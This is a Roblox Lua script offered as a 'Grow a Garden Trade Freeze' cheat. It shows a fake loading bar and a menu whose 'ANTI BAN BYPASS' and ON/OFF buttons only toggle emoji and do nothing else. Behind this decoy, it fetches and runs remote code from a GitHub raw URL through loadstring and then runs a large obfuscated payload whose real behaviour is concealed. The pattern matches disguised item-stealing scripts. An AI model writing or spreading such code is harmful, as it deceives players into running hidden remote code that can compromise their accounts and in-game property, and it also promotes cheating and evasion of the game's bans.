-- Создаём экран загрузки
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(1,0,1,0)
Frame.BackgroundColor3 = Color3.fromRGB(0,0,0)

-- Фон с красно-чёрным переливом
local Gradient = Instance.new("UIGradient")
Gradient.Parent = Frame
Gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
}
Gradient.Rotation = 0

-- Анимация фона
spawn(function()
    while wait(0.03) do
        Gradient.Rotation = (Gradient.Rotation + 1) % 360
    end
end)

-- Заголовок
local Title = Instance.new("TextLabel")
Title.Parent = Frame
Title.Size = UDim2.new(1,0,0,50)
Title.Position = UDim2.new(0,0,0.3,0)
Title.Text = "Grow a Garden Trade Freeze ❄️"
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.TextColor3 = Color3.fromRGB(255,255,255)
Title.BackgroundTransparency = 1

-- Подзаголовок
local SubTitle = Instance.new("TextLabel")
SubTitle.Parent = Frame
SubTitle.Size = UDim2.new(1,0,0,30)
SubTitle.Position = UDim2.new(0,0,0.4,0)
SubTitle.Text = "Loading..."
SubTitle.TextScaled = true
SubTitle.Font = Enum.Font.Gotham
SubTitle.TextColor3 = Color3.fromRGB(200,200,200)
SubTitle.BackgroundTransparency = 1

-- Прогресс-бар
local BarFrame = Instance.new("Frame")
BarFrame.Parent = Frame
BarFrame.Size = UDim2.new(0.6,0,0,30)
BarFrame.Position = UDim2.new(0.2,0,0.5,0)
BarFrame.BackgroundColor3 = Color3.fromRGB(50,50,50)
BarFrame.BorderSizePixel = 0
BarFrame.BackgroundTransparency = 0.3

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0,15)
Corner.Parent = BarFrame

local BarFill = Instance.new("Frame")
BarFill.Parent = BarFrame
BarFill.Size = UDim2.new(0,0,1,0)
BarFill.BackgroundColor3 = Color3.fromRGB(255,0,0)
BarFill.BorderSizePixel = 0

local FillCorner = Instance.new("UICorner")
FillCorner.CornerRadius = UDim.new(0,15)
FillCorner.Parent = BarFill

-- Текст процентов
local PercentText = Instance.new("TextLabel")
PercentText.Parent = Frame
PercentText.Size = UDim2.new(1,0,0,30)
PercentText.Position = UDim2.new(0,0,0.55,0)
PercentText.Text = "0%"
PercentText.TextScaled = true
PercentText.Font = Enum.Font.GothamBold
PercentText.TextColor3 = Color3.fromRGB(255,255,255)
PercentText.BackgroundTransparency = 1

-- Заполнение прогресс-бара
for i = 1, 100 do
    BarFill.Size = UDim2.new(i/100,0,1,0)
    PercentText.Text = i.."%"
    wait(0.18) -- около 18 секунд
end

-- Убираем загрузку
Frame:Destroy()

-- Маленькое меню
local MenuGui = Instance.new("ScreenGui")
MenuGui.Parent = game.CoreGui

local MenuFrame = Instance.new("Frame")
MenuFrame.Parent = MenuGui
MenuFrame.Size = UDim2.new(0,300,0,150)
MenuFrame.Position = UDim2.new(0.4,0,0.4,0)
MenuFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)

local MenuCorner = Instance.new("UICorner")
MenuCorner.CornerRadius = UDim.new(0,10)
MenuCorner.Parent = MenuFrame

-- Заголовок
local MenuTitle = Instance.new("TextLabel")
MenuTitle.Parent = MenuFrame
MenuTitle.Size = UDim2.new(1,0,0,30)
MenuTitle.Text = "GAG TRADE FREEZE ❄️ made by ARBIX"
MenuTitle.TextScaled = true
MenuTitle.Font = Enum.Font.GothamBold
MenuTitle.TextColor3 = Color3.fromRGB(255,255,255)
MenuTitle.BackgroundTransparency = 1

-- Кнопка ANTI BAN BYPASS
local AntiBanBtn = Instance.new("TextButton")
AntiBanBtn.Parent = MenuFrame
AntiBanBtn.Size = UDim2.new(1, -20, 0, 30)
AntiBanBtn.Position = UDim2.new(0,10,0,40)
AntiBanBtn.Text = "ANTI BAN BYPASS"
AntiBanBtn.TextScaled = true
AntiBanBtn.Font = Enum.Font.Gotham
AntiBanBtn.TextColor3 = Color3.fromRGB(255,255,255)
AntiBanBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)

local ABcorner = Instance.new("UICorner")
ABcorner.CornerRadius = UDim.new(0,5)
ABcorner.Parent = AntiBanBtn

local ABIndicator = Instance.new("TextLabel")
ABIndicator.Parent = AntiBanBtn
ABIndicator.Size = UDim2.new(0,20,1,0)
ABIndicator.Position = UDim2.new(1,-25,0,0)
ABIndicator.Text = ""
ABIndicator.TextScaled = true
ABIndicator.Font = Enum.Font.GothamBold
ABIndicator.BackgroundTransparency = 1

AntiBanBtn.MouseButton1Click:Connect(function()
    if ABIndicator.Text == "🟢" then
        ABIndicator.Text = ""
    else
        ABIndicator.Text = "🟢"
    end
end)

-- Подпись
local Note = Instance.new("TextLabel")
Note.Parent = MenuFrame
Note.Size = UDim2.new(1,0,0,20)
Note.Position = UDim2.new(0,0,0,75)
Note.Text = "must be on trade before using!"
Note.TextScaled = true
Note.Font = Enum.Font.Gotham
Note.TextColor3 = Color3.fromRGB(200,200,200)
Note.BackgroundTransparency = 1

-- Кнопки ON / OFF
local OnBtn = Instance.new("TextButton")
OnBtn.Parent = MenuFrame
OnBtn.Size = UDim2.new(0.45,0,0,30)
OnBtn.Position = UDim2.new(0.05,0,0,100)
OnBtn.Text = "ON"
OnBtn.TextScaled = true
OnBtn.Font = Enum.Font.GothamBold
OnBtn.TextColor3 = Color3.fromRGB(255,255,255)
OnBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)

local OnCorner = Instance.new("UICorner")
OnCorner.CornerRadius = UDim.new(0,5)
OnCorner.Parent = OnBtn

local OnIndicator = Instance.new("TextLabel")
OnIndicator.Parent = OnBtn
OnIndicator.Size = UDim2.new(0,20,1,0)
OnIndicator.Position = UDim2.new(1,-25,0,0)
OnIndicator.Text = ""
OnIndicator.TextScaled = true
OnIndicator.Font = Enum.Font.GothamBold
OnIndicator.BackgroundTransparency = 1

local OffBtn = Instance.new("TextButton")
OffBtn.Parent = MenuFrame
OffBtn.Size = UDim2.new(0.45,0,0,30)
OffBtn.Position = UDim2.new(0.5,0,0,100)
OffBtn.Text = "OFF"
OffBtn.TextScaled = true
OffBtn.Font = Enum.Font.GothamBold
OffBtn.TextColor3 = Color3.fromRGB(255,255,255)
OffBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)

local OffCorner = Instance.new("UICorner")
OffCorner.CornerRadius = UDim.new(0,5)
OffCorner.Parent = OffBtn

local OffIndicator = Instance.new("TextLabel")
OffIndicator.Parent = OffBtn
OffIndicator.Size = UDim2.new(0,20,1,0)
OffIndicator.Position = UDim2.new(1,-25,0,0)
OffIndicator.Text = ""
OffIndicator.TextScaled = true
OffIndicator.Font = Enum.Font.GothamBold
OffIndicator.BackgroundTransparency = 1

OnBtn.MouseButton1Click:Connect(function()
    OnIndicator.Text = "🟢"
    OffIndicator.Text = ""
end)

OffBtn.MouseButton1Click:Connect(function()
    OnIndicator.Text = ""
    OffIndicator.Text = "🔴"
end)

-- Делаем меню перетаскиваемым
local dragging, dragInput, dragStart, startPos
local function update(input)
    local delta = input.Position - dragStart
    MenuFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

MenuFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MenuFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

MenuFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- Загружаем твой основной скрипт
loadstring(game:HttpGet("https://raw.githubusercontent.com/ARBIXSCRIPTS/Main.lua8/refs/heads/main/Main.lua"))()
return(function(...)local g={"\051\119\107\073\055\121\107\073\103\078\088\071\103\089\116\043","\076\086\105\098\076\048\072\113\055\089\051\061","\055\081\115\078\115\081\043\080\088\047\111\088\121\114\111\110","\111\089\116\090\055\083\065\061","\109\099\080\104\115\122\051\073\054\054\085\075\048\057\114\098\122\076\073\053\057\052\119\088\056\051\107\074\103\098\118\061";"\055\086\105\071\111\048\115\073\051\089\043\102\111\104\061\061";"\068\114\107\110\082\068\074\103\121\086\076\113\103\083\072\054\107\084\061\061";"\107\119\043\113\121\078\081\052\050\068\076\121\088\049\115\102\107\089\069\061","\055\109\097\061";"\107\078\115\043\051\089\074\071\055\121\068\061";"\051\089\081\102\111\086\105\122";"\103\114\043\073\111\084\061\061","\055\121\081\073\082\101\061\061";"\107\049\108\083\056\078\088\068\115\109\076\115\111\078\071\052\076\114\051\061";"\082\049\105\081\051\098\081\088\051\107\107\098\055\049\107\110";"\078\047\105\113\055\089\088\043\077\101\061\061","\087\043\103\104\107\097\076\048\082\048\043\109\051\073\116\090","\084\067\097\066\082\049\076\067\056\089\088\071\068\119\076\084\068\087\101\061";"\114\080\119\082\083\071\116\080\065\049\088\080\103\054\109\073\100\056\077\080\109\110\119\117\080\116\082\071\089\108\101\075\083\049\070\068\066\108\061\061";"\051\089\107\122\055\083\111\043","\087\121\071\066\082\087\111\048\121\089\068\104\056\087\049\083","\055\086\049\073\084\119\115\119\087\119\081\107\103\067\069\074\115\084\061\061","\051\086\115\071\055\086\104\061";"\051\120\085\116\105\072\073\080\066\122\085\078\110\100\073\090\081\089\067\083\097\069\070\056\049\115\047\077\111\080\053\086\053\104\077\066\113\088\097\067\070\108\073\061";"\103\119\071\071\051\108\061\061","\077\043\103\116\050\109\115\098\111\049\107\110\111\043\111\121\111\108\061\061";"\100\086\113\082\089\085\110\053\103\083\066\071\111\053\079\090\105\101\061\061";"\078\047\105\114\103\104\061\061","\111\078\072\075\055\083\065\061","\051\083\088\075\082\121\074\114","\082\114\076\102\051\068\111\052\050\081\101\066\082\073\072\122\087\086\103\061";"\111\119\047\071\076\086\115\070";"\068\073\047\049\087\081\084\047\088\097\113\119\069\109\081\071\084\084\061\061";"\051\078\115\113\051\121\111\111\115\081\110\115\055\086\072\107","\078\047\105\118\111\121\066\061","\068\048\072\090\077\048\049\061";"","\107\086\081\122\051\086\107\075\065\097\088\043\076\086\107\067\076\086\107\049\065\084\061\061";"\055\109\065\061";"\056\048\088\073\051\097\076\043\076\101\061\061","\050\100\108\043\111\053\070\113\050\108\061\061";"\076\121\074\104\103\121\115\085","\076\086\081\100\055\086\068\061","\121\078\097\116\055\083\081\085\069\098\084\047\050\048\043\081\068\097\068\061","\087\098\107\069\115\119\076\085","\055\086\107\102";"\111\083\115\047\103\108\061\061","\111\119\081\122\111\084\061\061";"\050\108\061\061","\103\119\105\102\103\119\081\073";"\107\119\107\100\082\086\105\090\082\104\061\061","\078\047\105\122\111\078\088\071\076\086\081\100\055\086\068\061","\076\086\105\102\076\121\047\100\111\078\065\061"}for h,T in ipairs({{-1014399+1014400;-1043456+1043509},{-521968+521969,394604+-394568},{232615+-232578;-118383-(-118436)}})do while T[-212327+212328]<T[58658+-58656]do g[T[-1040768+1040769]],g[T[-102115+102117]],T[674870-674869],T[979838+-979836]=g[T[438896-438894]],g[T[-492207+492208]],T[167525+-167524]+(-549360-(-549361)),T[441582+-441580]-(236840-236839)end end local function h(h)return g[h-(483183+-471989)]end do local h=g local T=type local x={n=101668-101667;b=-519344+519395,l=238183+-238151;m=625395+-625392;R=71484-71458,t=-664836-(-664885),["\055"]=-383468+383495;["\054"]=1043626-1043584,i=1017536+-1017475;Q=-259496+259501,G=595250+-595217;M=1021568+-1021538,W=-1036653-(-1036672);j=-492592-(-492655),w=-815545+815599;J=-127588+127645;["\057"]=-503604-(-503664);N=-1012927+1012950;E=-389548+389560,y=-618547+618569;p=-77735-(-77794),a=-242852-(-242856);O=-70184-(-70242);v=-299369+299413,F=571738-571698;T=541441-541425,z=-1037203-(-1037248),["\053"]=817017+-817015;["\043"]=-551921+551958;Y=-82019+82057,["\051"]=233667-233639,f=-300009+300055,L=953243-953214,k=636681-636660;I=135832-135780,s=-553585+553598,u=-827419-(-827450),A=931461-931453;X=1022289-1022272,["\049"]=-445578-(-445614);q=11977-11936;h=-891452+891500,S=788664+-788609,e=423213+-423213;H=722367-722358;V=988997-988991;["\056"]=-352857-(-352875);U=-400620+400663;["\048"]=-505776+505783;D=-137252+137272,C=826362+-826327;d=282827-282793;["\050"]=-203480-(-203494);Z=324185-324138,r=-243240+243279,x=-873777-(-873787);B=350763+-350707;K=-979582+979632;["\047"]=-704886+704939;["\052"]=-990196-(-990207);P=428668-428653,o=-24328-(-24353),c=-590196-(-590258);g=-857339+857363}local q=string.sub local u=math.floor local b=string.len local F=string.char local z=table.concat local e=table.insert for g=877308-877307,#h,590130+-590129 do local d=h[g]if T(d)=="\115\116\114\105\110\103"then local T=b(d)local y={}local r=976895-976894 local W=-215847-(-215847)local n=-897276+897276 while r<=T do local g=q(d,r,r)local h=x[g]if h then W=W+h*(812409-812345)^((-626419+626422)-n)n=n+(-895676+895677)if n==360111-360107 then n=943293-943293 local g=u(W/(-871483+937019))local h=u((W%(665843-600307))/(-460078-(-460334)))local T=W%(723830-723574)e(y,F(g,h,T))W=150629-150629 end elseif g=="\061"then e(y,F(u(W/(199718+-134182))))if r>=T or q(d,r+(-162212-(-162213)),r+(816249+-816248))~="\061"then e(y,F(u((W%(-621619+687155))/(829434-829178))))end break end r=r+(-565873-(-565874))end h[g]=z(y)end end end return(function(g,x,q,u,b,F,z,Y,Z,p,y,J,W,j,e,T,r,n,v,d,K,X)K,Y,d,J,n,y,T,Z,v,X,e,j,p,W,r=function(g)d[g]=d[g]-(460078+-460077)if d[g]==315370+-315370 then d[g],e[g]=nil,nil end end,function(g,h)local x=W(h)local q=function(q,u,b,F,z)return T(g,{q;u,b;F,z},h,x)end return q end,{},function(g,h)local x=W(h)local q=function(q,u,b,F)return T(g,{q,u,b;F},h,x)end return q end,function(g)local h,T=508720+-508719,g[-20512-(-20513)]while T do d[T],h=d[T]-(795961+-795960),h+(892412+-892411)if-346347+346347==d[T]then d[T],e[T]=nil,nil end T=g[h]end end,function()r=(-525615-(-525616))+r d[r]=-748918-(-748919)return r end,function(T,q,u,b)local U,M,H,n,O,C,z,Q,D,S,r,p,R,m,B,W,s,i,o,w,l,P,I,k,L,E,t,f,G,a,V,c,d,N while T do if T<8055963-356523 then if T<3869939-908988 then if T<273960+872564 then if T<-834490+1494348 then if T<-176869+647229 then if T<-710739-(-1039744)then if T<-1007807+1192363 then T=O z=Q T=Q and-927549+11608707 or-559153+2563182 else Q=j(17301553-758840,{})z=h(-470831+482061)T=g[z]d=e[u[497907-497903]]n=h(372107-360875)W=g[n]M=h(201638+-190438)l=g[M]M={l(Q)}B={x(M)}l=-785142-(-785144)p=B[l]n=W(p)W=h(788344+-777126)r=d(n,W)d={r()}z=T(x(d))r=e[u[-220066-(-220071)]]d=z z=r T=r and 133732+8769708 or-219879+7915986 end else o=-654644+654645 V=-167780-(-167781)c=#D N=n(V,c)V=B(D,N)c=e[U]w=V-o N=nil E=l(w)c[V]=E T=-576370+3877846 V=nil end else if T<-560177+1099990 then k=554610-554609 T=e[l]c=-276009+276015 L=T(k,c)T=h(227559+-216343)c=h(1021120+-1009904)g[T]=L k=g[c]c=-157027-(-157029)T=k>c T=T and 12128147-275497 or 14673888-(-667125)else d=h(822143-810937)T=g[d]W=-932093-(-932093)r=e[u[749823-749815]]d=T(r,W)T=-178150+8662249 end end else if T<231418-(-653684)then if T<638623-(-77218)then T=g[h(366487-355243)]z={r}else E=not c C=C+k z=C<=L z=E and z E=C>=L E=c and E z=E or z E=653556+1962331 T=z and E z=7739149-920125 T=T or z end else if T<1702666-590834 then T=z and-825019-(-1018048)or 405933+12483037 else T=-312618-(-1016127)B=nil l=nil n=nil end end end else if T<955582+1056779 then if T<-926973+2839295 then if T<1651907-38689 then if T<205222+1354290 then T=-246761-(-344043)D=h(-1003647+1014867)U=g[D]D=h(-1024064+1035283)I=U[D]Q=I else N={}M=nil l=nil E=y()V=y()M=33686457006267-474671 R=h(877883+-866654)B=nil D=nil D=h(789496+-778283)z={}e[V]=N N=y()c=Z(826362+14047180,{V;Q;O,p})G=nil w=h(-815771-(-827002))e[N]=c l=-510064+2637190910472 c={}e[E]=c c=g[w]T=g[h(-425581+436792)]f=e[E]o={}t=h(-29025+40271)S={[t]=f,[R]=G}n=nil w=c(o,S)c=X(16749152-647796,{E,V;U;Q,O;N})p=K(p)B=h(164069+-152865)E=K(E)r=w W=c N=K(N)V=K(V)O=K(O)p=W(B,l)Q=K(Q)O=h(584626+-573401)Q=988991+24992102663084 l=h(-958909-(-970110))n=r[p]V=h(-746452-(-757687))p=h(-357995+369235)I=nil g[p]=n U=K(U)B=W(l,M)p=r[B]B=h(218626-207398)M=h(209506-198310)g[B]=p l=W(M,Q)B=r[l]l=h(-328362+339575)c=18773875274293-290281 M=h(230859-219623)g[l]=B l=g[M]Q=g[O]U=g[D]N=W(V,c)W=nil D=r[N]I=U..D U=h(-570994+582211)r=nil U=Q[U]O={U(Q,I)}M=l(x(O))l=M()end else k=h(350251+-339044)M=O L=g[k]k=h(-760398-(-771640))C=L[k]L=C(d,M)C=e[u[-757809-(-757815)]]k=C()V=L+k N=V+B V=-7520+7776 D=N%V k=846267-846266 B=D T=6785968-666357 V=W[r]L=B+k C=n[L]M=nil N=V..C W[r]=N end else if T<988671+1014817 then e[r]=z T=-374444+7153019 else O=h(583218+-571999)Q=g[O]T=-362411+11043569 z=Q end end else if T<2035387-(-487791)then if T<781240+1395754 then d=h(-103075+114290)z=h(-906422-(-917628))T=g[z]z=T(d)z={}T=g[h(-611753-(-622963))]else O=942462-942461 T={}p=932669+35184371156163 e[u[737593-737591]]=T z=e[u[443886+-443883]]n=z z=r%p M=h(29473+-18266)e[u[-988863+988867]]=z l=-1003776-(-1004031)B=r%l l=-759798-(-759800)p=B+l T=60834+6058777 e[u[180267-180262]]=p l=g[M]M=h(-441134+452357)B=l[M]I=O l=B(d)B=h(-871981-(-883195))O=542769+-542769 Q=l M=-1042623-(-1042624)W[r]=B B=-229927+229936 U=I<O O=M-I end else if T<2023216-(-628979)then E=y()e[E]=C o=399440-399340 w=h(226130-214887)s=700485-690485 z=g[w]w=h(-421677+432918)T=z[w]w=-567665-(-567666)z=T(w,o)w=y()e[w]=z T=e[l]S=338474+-338219 o=383660+-383660 z=T(o,S)o=y()e[o]=z S=-200294+200295 G=h(-362923+374155)T=e[l]t=e[w]R=-971772-(-971774)f=723063-723062 z=T(S,t)S=y()e[S]=z z=e[l]t=z(f,R)z=-649076+649077 i=-637044+637044 T=t==z R=h(912764+-901538)z=h(270778-259560)t=y()e[t]=T P=g[G]T=h(-21769-(-32993))H=e[l]a={H(i,s)}T=N[T]G=P(x(a))P=h(-480111+491337)m=G..P f=R..m T=T(N,z,f)R=h(750263+-739063)f=y()e[f]=T m=J(-830842+13032687,{l;E;O,W,r;V,t,f,w,S;o,Q})z=g[R]R={z(m)}T={x(R)}R=T T=e[t]T=T and-728823+17298673 or 14704225-139428 else T=true e[u[-530928+530929]]=T z={}T=g[h(-683665-(-694902))]end end end end else if T<5375062-(-743671)then if T<5510538-199462 then if T<780472+3201599 then if T<3685671-207974 then if T<4304983-1007295 then B=e[p]T=3843477-(-6880)z=B else c=-36321-(-36321)V=#D N=V==c T=N and 845625-(-735991)or-113956+484143 end else B=z l=h(88781-77538)z=g[l]M=h(552837-541617)l=h(-1025303-(-1036544))T=z[l]l=y()U=h(644788+-633568)e[l]=T z=g[M]M=h(286788-275561)T=z[M]M=T O=T I=g[U]T=I and-858171+2368617 or 184485-87203 Q=I end else if T<4631527-(-422765)then V=#D c=-941437+941437 N=V==c T=-572530+942717 else r=e[u[551345+-551342]]W=-688116-(-688117)d=r~=W T=d and 977918+8110359 or 5481991-(-411821)end end else if T<-288553+5980177 then if T<4559534-(-835898)then T=v(12123922-1015231,{n})L={T()}z={x(L)}T=g[h(-405421+416620)]else W=h(601017-589810)d=q T=true r=y()e[r]=T l=h(-613875+625075)n=y()z=g[W]W=h(-331490-(-342699))T=z[W]W=y()p=y()e[W]=T T=J(1991068-(-30369),{})e[n]=T T=false e[p]=T B=g[l]M=J(2186402-(-656308),{p})l=B(M)T=l and 3266179-(-18913)or 787640+3062717 z=l end else if T<531376+5503498 then T=5846739-576050 W=964081-963966 r=e[u[63333-63330]]d=r*W r=221095+-220838 z=d%r e[u[-430570-(-430573)]]=z else z=m T=P T=1417099-(-585906)end end end else if T<-243560+6986507 then if T<6700605-180006 then if T<5575655-(-592434)then if T<689013+5431138 then D=not U O=O+I M=O<=Q M=D and M D=O>=Q D=U and D M=D or M D=821368-(-993727)T=M and D M=1842520-701750 T=T or M else T=g[h(-119201-(-130404))]z={}end else o=not w V=V+E N=V<=c N=o and N o=V>=c o=w and o N=o or N o=-702390+10550499 T=N and o N=3795091-(-341995)T=T or N end else if T<515760+6181760 then W=894588+-894483 r=e[u[-768374-(-768376)]]d=r*W r=-298281+12013390444764 z=d+r d=-484015+35184372572847 T=z%d r=-552368-(-552369)e[u[-106401-(-106403)]]=T d=e[u[-192931-(-192934)]]z=d~=r T=6698285-804473 else e[r]=m i=-486702-(-486703)a=e[S]H=a+i G=R[H]P=I+G G=641716+-641460 T=P%G H=e[o]G=U+H H=-836666-(-836922)P=G%H U=P I=T T=7361537-582962 end end else if T<-631796+7709862 then if T<7241181-423725 then o=K(o)R=nil E=K(E)f=K(f)w=K(w)t=K(t)T=-175013+923579 S=K(S)else L=e[r]C=L T=L and 8389728-(-488623)or 1026112+14208401 end else if T<-619507+8259532 then W=W+p r=W<=n l=not B r=l and r l=W>=n l=B and l r=l or r l=11602050-(-26337)T=r and l r=11050418-995967 T=T or r else d=nil e[u[-285993+285998]]=z T=12753318-(-135652)end end end end end else if T<-516400+11716513 then if T<9873926-666613 then if T<370603+8325332 then if T<-927613+9045216 then if T<8222514-300585 then if T<7341387-(-384108)then T=151205+9053812 else W=h(111351-100131)T=g[h(-127870-(-139108))]r=g[W]W=h(-479407+490604)d=r[W]W=e[u[706678+-706677]]r={d(W)}z={x(r)}end else T=61026+14801764 end else if T<8353096-(-100835)then z=h(-364267+375483)d=h(-291689+302928)T=g[z]z=g[d]d=h(962852-951613)g[d]=T d=h(-473951-(-485167))T=9287548-(-80290)g[d]=z d=e[u[218535+-218534]]r=d()else r=-189158+189159 W=e[u[-959669-(-959678)]]T={}n=W W=920382-920381 p=W W=-37153+37153 d=T T=7124281-(-340907)B=p<W W=r-p end end else if T<357419+8636784 then if T<485807+8407221 then L=I==U T=14337557-(-896956)C=L else W=e[u[-137892+137898]]T=844986+6851121 r=W==d z=r end else if T<998335+8120137 then r=e[u[-947002-(-947005)]]W=-982654+982686 d=r%W I=158693+-158680 Q=-66656-(-66658)n=e[u[-520684-(-520688)]]l=e[u[465072-465070]]N=e[u[249259-249256]]D=N-d N=509392-509360 U=D/N O=I-U M=Q^O B=l/M p=n(B)M=-417133+417134 n=4293962433-(-1004863)W=p%n p=1042050-1042048 n=p^d r=W/n n=e[u[550901-550897]]l=r%M M=317866+4294649430 B=l*M p=n(B)d=nil n=e[u[-329386+329390]]B=n(r)W=p+B p=-553009+618545 n=W%p B=W-n T=8274844-525488 l=-1036032+1101568 Q=-896892-(-897148)p=B/l l=415533+-415277 B=n%l r=nil M=n-B l=M/Q Q=-638388+638644 M=p%Q I=-28065+28321 W=nil O=p-M n=nil Q=O/I O={B,l,M;Q}l=nil e[u[-1025216+1025217]]=O Q=nil B=nil p=nil M=nil else N=nil I=nil Q=K(Q)U=nil V=K(V)D=nil r=K(r)O=K(O)V=-523888-(-524144)c=V n=K(n)V=134564+-134563 N=-57634+57635 W=K(W)l=K(l)M=nil D={}W=nil p=K(p)B=nil Q=h(1021824+-1010617)r=nil O=y()B=h(-8608+19851)p=g[B]B=h(529554-518320)n=p[B]I={}p=y()M=h(30965-19745)e[p]=n l=h(836346+-825103)B=g[l]T=-593074+6937459 l=h(588315-577074)n=B[l]l=g[M]E=V V=-633204+633204 M=h(1010559+-999362)B=l[M]U=y()M=g[Q]Q=h(-649906-(-661108))l=M[Q]M=696502-696502 Q=y()e[Q]=M w=E<V M=-68706+68708 e[O]=M e[U]=I M={}V=N-E I=165285-165285 end end end else if T<10726751-1038208 then if T<8610002-(-840442)then if T<-759608+10164014 then if T<8713716-(-649780)then T=true T=-863419+6240607 else T=true T=T and-83491+8520996 or 5461766-(-662453)end else T=g[h(-857659+868904)]z={}end else if T<219687+9245916 then a=207399-207398 H=R[a]a=false P=T G=H==a T=G and 14158864-207462 or-433837+6545255 m=G else r=e[u[-556337+556339]]W=e[u[44196-44193]]d=r==W T=425196-(-486703)z=d end end else if T<9312088-(-768184)then if T<460078+9519084 then N=V o=N T=5360899-(-983486)D[N]=o N=nil else T=e[u[546299-546289]]r=e[u[-476580-(-476591)]]d[T]=r T=e[u[-717686+717698]]r={T(d)}z={x(r)}T=g[h(-640436+651669)]end else if T<10872127-(-120740)then Q=y()e[Q]=z O=-252264+252267 N=Y(581490+10962926,{})I=-377963-(-378028)T=e[l]D=h(666101+-654901)z=T(O,I)O=y()e[O]=z T=-438830-(-438830)I=T z=g[D]T=-372204-(-372204)D={z(N)}U=T z=-29473+29475 T={x(D)}D=T T=D[z]z=h(8672+2558)N=T k=h(876859+-865627)T=g[z]V=e[W]L=g[k]k=L(N)L=h(473344-462126)C=V(k,L)V={C()}z=T(x(V))V=y()e[V]=z z=-726070-(-726071)C=e[O]L=C C=527153-527152 k=C C=403885-403885 T=-679541+1428107 c=k<C C=z-k else T=10176727-808889 end end end end else if T<15704694-848506 then if T<672117+12715222 then if T<-299369+12401413 then if T<12173234-439214 then if T<12035269-467566 then W=5625739-(-762680)z=677493+15899013 r=h(-723190+734412)d=r^W T=z-d d=T z=h(958846+-947599)T=z/d z={T}T=g[h(697142+-685947)]else r=W M=-310698-(-310698)Q=-3937-(-4192)T=e[u[-852537-(-852538)]]l=T(M,Q)d[r]=l T=8192155-726967 r=nil end else k=h(-350987-(-362219))T=g[k]E=h(-552817+564056)c=g[E]k=T(c)T=h(355243+-344027)g[T]=k T=12985900-(-650612)end else if T<705334+12048590 then r=e[u[-338601-(-338602)]]n=-905020+905021 p=1035010-1035008 W=r(n,p)r=286505+-286504 d=W==r z=d T=d and 465965-(-445934)or 8943088-(-630068)else T=e[u[126372+-126365]]T=T and 313514+275816 or 8390880-(-93219)end end else if T<15018656-979838 then if T<13265117-(-636852)then T=14095502-(-767288)else a=717622+-717620 T=921021+5190397 H=R[a]a=e[f]G=H==a m=G end else if T<13630866-(-818617)then G=-628787+628788 P=R[G]m=P T=422637+6282208 else P=e[r]T=P and-802105+14993642 or 5976726-(-728119)m=P end end end else if T<658356+15126023 then if T<-846970+16184051 then if T<14545549-(-587890)then if T<15269147-405677 then T=true T=T and 1491150-955070 or 10263641-848698 else d=e[u[-261928+261929]]z=#d d=-225127-(-225127)T=z==d T=T and-877115+7479556 or 7363648-(-385708)end else e[r]=C T=e[r]T=T and 8016468-303465 or 8652264-(-685877)end else if T<112675+15268077 then c=h(-320986-(-332202))T=g[c]c=h(-474824-(-486063))g[c]=T T=12916650-(-719862)else T=34592-(-668917)end end else if T<-261544+16457657 then if T<-950141+17073672 then r=q[748727+-748725]T=e[u[91171+-91170]]W=T T=W[r]d=q[-346282-(-346283)]T=T and 560113+14918632 or 2277029-(-207782)else T=true T=T and 7419522-(-538225)or-180710+5557898 end else if T<-901116+17465870 then W=-905660+5804114 z=515952+6187869 r=h(997951+-986753)d=r^W T=z-d z=h(374252+-363044)d=T T=z/d z={T}T=g[h(890940+-879719)]else m=e[r]z=m T=m and 10436575-974014 or 2262181-259176 end end end end end end end T=#b return x(z)end,function(g,h)local x=W(h)local q=function(q,u)return T(g,{q,u},h,x)end return q end,function(g,h)local x=W(h)local q=function(q,u,b)return T(g,{q,u;b},h,x)end return q end,function(g,h)local x=W(h)local q=function(q,u,b,F,z,e)return T(g,{q;u;b,F;z,e},h,x)end return q end,{},function(g,h)local x=W(h)local q=function(q)return T(g,{q},h,x)end return q end,function(g,h)local x=W(h)local q=function(...)return T(g,{...},h,x)end return q end,function(g)for h=-258152+258153,#g,700918+-700917 do d[g[h]]=d[g[h]]+(-536560-(-536561))end if q then local T=q(true)local x=b(T)x[h(1001261-990015)],x[h(346411+-335206)],x[h(275380-264168)]=g,n,function()return 89699-849146 end return T else return u({},{[h(-704881-(-716086))]=n,[h(-44193+55439)]=g,[h(440121-428909)]=function()return 279145-1038592 end})end end,252008-252008 return(p(819577+4578604,{}))(x(z))end)(getfenv and getfenv()or _ENV,unpack or table[h(804876-793657)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
